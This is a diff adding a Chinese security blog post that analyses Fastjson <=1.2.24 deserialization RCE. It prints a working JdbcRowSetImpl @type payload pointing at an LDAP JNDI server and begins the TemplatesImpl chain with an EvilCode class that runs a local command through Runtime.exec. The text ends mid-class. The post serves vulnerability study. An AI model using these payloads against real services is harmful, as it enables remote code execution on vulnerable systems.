@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>Fastjson&lt;=1.2.24反序列化分析 | Wileysec&#39;s Blog</title>
+
+
+    <meta name="keywords" content="Java安全, Fastjson, alibaba">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="影响版本最早在fastjson1.2.24及之前的版本被曝存在远程代码执行漏洞，由于fastjson可以使用 @type 指定反序列化任意类，攻击者可在jdk包中查找能够构造出恶意类的方法，在其反序列化时会调用其getter或setter方法。 具体影响范围：1.2.22 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.24 JdbcRowSetImpl利用链com.sun.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson&lt;&#x3D;1.2.24反序列化分析">
+<meta property="og:url" content="https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/11c62fd672b4.html">
+<meta property="og:site_name" content="Wileysec&#39;s Blog">
+<meta property="og:description" content="影响版本最早在fastjson1.2.24及之前的版本被曝存在远程代码执行漏洞，由于fastjson可以使用 @type 指定反序列化任意类，攻击者可在jdk包中查找能够构造出恶意类的方法，在其反序列化时会调用其getter或setter方法。 具体影响范围：1.2.22 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.24 JdbcRowSetImpl利用链com.sun.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230718172003391.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230718220024269.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230718220430340.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230718221114413.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230718221733815.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230718222044574.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230718222629098.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213023505.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213028021.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213032216.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213043887.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213048446.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213052715.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213057315.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213132416.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213137034.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213141831.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213255640.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213337563.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213420999.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213438503.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213443139.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213448062.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213451912.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213531151.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213544983.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213607949.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213630191.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213654951.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213700214.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213707360.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213746296.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213752741.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230731213758862.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112403694.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112408475.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112411540.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112448333.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112540172.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112545224.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112637607.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112641246.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802220248759.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802220511062.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802220637848.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802220905757.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802221042449.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802221256892.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802221402556.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112653237.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112657428.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112707125.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112731017.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112915054.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802112925992.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802113012859.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802113016492.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802113019459.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802124050218.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230802124349503.png">
+<meta property="og:image" content="https://wileysec.github.io/images/wps14.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps15.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps16.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps17.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps18.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps19.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps20.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps21.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps22.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps23.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps24.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps25.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps26.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps27.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps28.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps29.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps30.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps31.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps32.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps33.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps34.jpg">
+<meta property="og:image" content="https://wileysec.github.io/images/wps35.jpg">
+<meta property="article:published_time" content="2023-07-18T07:41:50.063Z">
+<meta property="article:modified_time" content="2023-08-25T18:04:40.076Z">
+<meta property="article:author" content="wileysec">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="Fastjson">
+<meta property="article:tag" content="alibaba">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wileysec.github.io/images/image-20230718172003391.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/themes/prism-tomorrow.min.css" media="none" >
+        
+    
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.css" media="none" onload="this.media='all'">
+    
+
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Wiley&#39;s Blog</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/links/" class="navbar-menu button">链接</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于我</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/links/" class="dropdown-menu button">链接</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于我</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        Fastjson&lt;=1.2.24反序列化分析
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2023/07/" class="post-meta__date button">文章创建于 2023-07-18</a>
+        
+    <span class="separate-dot"></span><a href="/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/" class="button">Java安全,技术分享</a>
+
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">JdbcRowSetImpl利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">TemplatesImpl利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">BCEL利用链</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">JdbcRowSetImpl利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">TemplatesImpl利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">BCEL利用链</span></a></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>最早在fastjson1.2.24及之前的版本被曝存在远程代码执行漏洞，由于fastjson可以使用 <code>@type</code> 指定反序列化任意类，攻击者可在jdk包中查找能够构造出恶意类的方法，在其反序列化时会调用其getter或setter方法。</p>
+<p>具体影响范围：1.2.22 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.24</p>
+<h2 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h2><p><code>com.sun.rowset.JdbcRowSetImpl</code> 这条利用链是比较简单的，该类提供对数据库连接的操作，由于提供了JNDI的支持且参数可控，导致出现JNDI注入。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> main <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/lovxJNmO\",\"autoCommit\":false&#125;"</span><span class="token punctuation">;</span>
+         <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>根据上一篇FastJson反序列化分析中，我们已经知道会自动调用带有 <code>@type</code> 的json字符串中的属性setter方法。我们又知道，在 <code>JdbcRowSetImpl</code> 类中存在一个参数可控的JNDI注入</p>
+<p><img src="/images/image-20230718172003391.png" alt="image-20230718172003391"></p>
+<p>在该类中搜索一下，在这个地方进行了JNDI查找操作</p>
+<p><img src="/images/image-20230718220024269.png" alt="image-20230718220024269"></p>
+<p>继续查找 <code>getDataSourceName</code> 方法，返回了 <code>BaseRowSet</code> 类中的 <code>dataSource</code> 属性，由于 <code>JdbcRowSetImpl</code> 继承了 <code>BaseRowSet</code> 类，那么我们看一下是哪个方法对 <code>dataSource</code> 进行了赋值</p>
+<p><img src="/images/image-20230718220430340.png" alt="image-20230718220430340"></p>
+<p>在 <code>JdbcRowSetImpl</code> 类中，获取了 <code>getDataSourceName</code> 的值，这就是为什么我们在json字符串中先把 <code>dataSourceName</code> 放在前面，因为首先会先调用到 <code>setDataSourceName</code> 方法，如果反过来可能会导致空指针的报错</p>
+<p>所以会执行到 <code>super.setDataSourceName</code> 方法，调用了父类的 <code>setDataSourceName</code> 方法</p>
+<p><img src="/images/image-20230718221114413.png" alt="image-20230718221114413"></p>
+<p>来到了父类的这个方法，其实就是判断是否为空，这就是我们传入的 <code>ldap://127.0.0.1:8085/lovxJNmO</code> 这个字符串，再然后就进行了赋值的操作。</p>
+<p>和上面我们说的已经对上了，现在 <code>dataSource</code> 就是我们的恶意ldap服务，现在只需要调用 <code>connect</code> 方法即可执行恶意代码。</p>
+<p><img src="/images/image-20230718221733815.png" alt="image-20230718221733815"></p>
+<p>经过查找，发现 <code>setAutoCommit</code> 方法调用了 <code>connect</code> 方法，而 <code>getDatabaseMetaData</code> 方法是getter方法且没有参数，这个不适合我们去利用。</p>
+<p><img src="/images/image-20230718222044574.png" alt="image-20230718222044574"></p>
+<p><img src="/images/image-20230718222629098.png" alt="image-20230718222629098"></p>
+<p>这样就查找了恶意的ldap服务执行了恶意代码，走到了JSONException这里是因为没有设置 <code>Feature.SupportNonPublicField</code> 参数，报错但不影响执行。</p>
+<h2 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h2><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 这条利用链需要启用 <code>Feature.SupportNonPublicField</code> 对非公开字段的反序列化的访问。</p>
+<p>在编写恶意类时，该恶意类必须继承 <code>AbstractTranslet</code>，至于为什么需要继承该类，到后面分析自然就知道了。还需要将恶意类编译生成的.class文件进行Base64编码，因为在利用过程中会对 <code>_bytecodes</code> 进行Base64解码，具体看后面分析。</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// ByteCodetoBase64.java</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">BufferedInputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ByteCodetoBase64</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// 读取字节码文件</span>
+        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/Users/wiley/IdeaProjects/javaResearch/target/classes/FastjsonResearch/EvilCode.class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode <span class="token operator">=</span> <span class="token function">readBytecode</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment">// 将字节码文件转换为Base64编码</span>
+        <span class="token class-name">String</span> base64 <span class="token operator">=</span> <span class="token function">encodeToBase64</span><span class="token punctuation">(</span>bytecode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>base64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">readBytecode</span><span class="token punctuation">(</span><span class="token class-name">File</span> file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">BufferedInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> bytesRead<span class="token punctuation">;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bytesRead <span class="token operator">=</span> bis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> bytesRead<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+            fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            bis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            bos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">return</span> bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encodeToBase64</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytecode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// EvilCode.java</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilCode</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token class-name">EvilCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span>SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token punctuation">&#125;</span>
+
